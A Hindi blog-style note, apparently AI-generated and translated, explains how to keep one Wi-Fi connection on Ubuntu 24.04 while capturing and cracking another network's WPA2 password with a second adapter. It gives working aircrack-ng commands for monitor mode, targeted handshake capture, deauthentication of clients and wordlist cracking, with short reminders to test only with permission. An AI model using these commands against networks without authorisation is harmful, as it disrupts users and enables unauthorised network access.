---
audio: false
generated: true
image: false
lang: hi
layout: post
model: x-ai/grok-4-fast
title: सुरक्षा परीक्षण के लिए दोहरे वाई-फाई एडाप्टर
translated: true
type: note
---

हाँ, Ubuntu 24.04 एक वाईफाई नेटवर्क से ज्ञात पासवर्ड का उपयोग करके (इंटरनेट एक्सेस के लिए) कनेक्ट हो सकता है, और साथ ही साथ किसी दूसरे वाईफाई नेटवर्क के पासवर्ड को "हैक" (जैसे, क्रैक करना या टेस्ट करना) करने का प्रयास भी कर सकता है, लेकिन इसके लिए विशिष्ट हार्डवेयर और संघर्षों से बचने के लिए सावधानीपूर्वक कॉन्फ़िगरेशन की आवश्यकता होती है। यह सेटअप आपके अपने नेटवर्क पर एथिकल पैनेट्रेशन टेस्टिंग या सुरक्षा ऑडिटिंग के लिए आम है—ध्यान दें कि अनधिकृत एक्सेस अवैध है।

### मुख्य आवश्यकताएँ
- **दो वाईफाई एडाप्टर**: आपको कम से कम दो अलग-अलग वायरलेस इंटरफेस की आवश्यकता होती है (जैसे, कनेक्शन के लिए बिल्ट-इन लैपटॉप वाईफाई `wlan0` और मॉनिटरिंग के लिए एक USB वाईफाई एडाप्टर `wlan1`)। एक ही एडाप्टर एक साथ कनेक्टेड (मैनेज्ड मोड) और मॉनिटर मोड में नहीं हो सकता।
  - मॉनिटर मोड के लिए अनुशंसित एडाप्टर: Intel (जैसे, AX200/AX210), Atheros, या संगत Realtek चिपसेट। `iw list` के साथ संगतता जांचें ("monitor" को सपोर्टेड इंटरफेस मोड्स में देखें)।
- **टूल्स**: स्कैनिंग, हैंडशेक कैप्चर करने और क्रैकिंग के लिए `aircrack-ng` सूट इंस्टॉल करें:  
  ```
  sudo apt update && sudo apt install aircrack-ng
  ```
- **Ubuntu 24.04 विशिष्टताएँ**: पिछले वर्जन से कोई बड़ा बदलाव नहीं—NetworkManager कनेक्शन हैंडल करता है, लेकिन मॉनिटर मोड टूल ठीक से मैनेज न किए जाने पर हस्तक्षेप कर सकते हैं। Kernel 6.8+ आधुनिक एडाप्टर को अच्छी तरह सपोर्ट करता है।

### यह कैसे काम करता है: चरण-दर-चरण सेटअप
1. **ज्ञात वाईफाई से कनेक्ट करें (मैनेज्ड मोड)**:
   - सामान्य रूप से कनेक्ट करने के लिए NetworkManager (GUI या CLI) का उपयोग करें:  
     ```
     nmcli device wifi connect "YourKnownSSID" password "knownpassword"
     ```
   - सत्यापन: `nmcli connection show --active`. यह आपका इंटरनेट कनेक्शन पहले इंटरफेस (जैसे, `wlan0`) पर एक्टिव रखता है।

2. **मॉनिटरिंग के लिए दूसरे एडाप्टर को सेटअप करें (पहले को बाधित किए बिना)**:
   - इंटरफेस की पहचान करें: `iw dev` (जैसे, `wlan1` आपका USB एडाप्टर है)।
   - `airmon-ng` (aircrack-ng से) का उपयोग करने से बचें, क्योंकि यह अक्सर NetworkManager को बंद कर देता है और कनेक्शन में बाधा डालता है। इसके बजाय, मैन्युअल `iw` कमांड का उपयोग करें:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```
   - सत्यापन: `iw dev` (`wlan1` के लिए `type monitor` दिखाना चाहिए)।

3. **पासवर्ड क्रैकिंग के लिए स्कैन और कैप्चर करें**:
   - नेटवर्क स्कैन करें: `sudo airodump-ng wlan1` (SSID, BSSID, चैनल सूचीबद्ध करता है; रोकने के लिए Ctrl+C दबाएं)।
   - एक विशिष्ट नेटवर्क को टारगेट करें (जैसे, BSSID `AA:BB:CC:DD:EE:FF` चैनल 6 पर):  
     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```
     यह पैकेट्स को `capture-01.cap` में कैप्चर करता है। WPA2 क्रैकिंग के लिए, 4-वे हैंडशेक की प्रतीक्षा करें (या एथिकली डीऑथ के साथ एक फोर्स करें: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`)।
   - ऑफलाइन क्रैक करें: `sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **सामान्य ऑपरेशन बहाल करें**:
   - मॉनिटरिंग बंद करें:  
     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```
   - आवश्यकता होने पर पुनः कनेक्ट करें: NetworkManager रीस्टार्ट करें (`sudo systemctl restart NetworkManager`) या `nmcli` का उपयोग करें।

### संभावित समस्याएँ और समाधान
- **कनेक्शन ड्रॉप**: यदि पहला वाईफाई डिस्कनेक्ट हो जाता है (मैन्युअल विधि के साथ दुर्लभ), DHCP रिन्यू करें: `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **हस्तक्षेप**: केवल मॉनिटर इंटरफेस पर कॉन्फ्लिक्ट करने वाली प्रक्रियाओं को बंद करें: `sudo airmon-ng check kill` (लेकिन यह सभी को प्रभावित करता है—सावधानी से उपयोग करें)।
- **USB एडाप्टर स्थिरता**: कुछ सस्ते एडाप्टर मॉनिटर मोड में ड्रॉप करते हैं; `iwconfig` या `iw dev` के साथ टेस्ट करें।
- **वायर्ड विकल्प**: यदि दूसरा वाईफाई नहीं है, तो इंटरनेट के लिए ईथरनेट का उपयोग करें और सिंगल वाईफाई एडाप्टर पर मॉनिटर करें (आसान, क्योंकि NetworkManager को बंद करने से वायर्ड प्रभावित नहीं होगा)।

यह सेटअप टेस्टिंग उद्देश्यों के लिए Ubuntu 24.04 पर विश्वसनीय रूप से काम करता है। नेटवर्क का टेस्ट करने से पहले हमेशा अनुमति लें।

### संदर्भ
- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)  
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)  
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)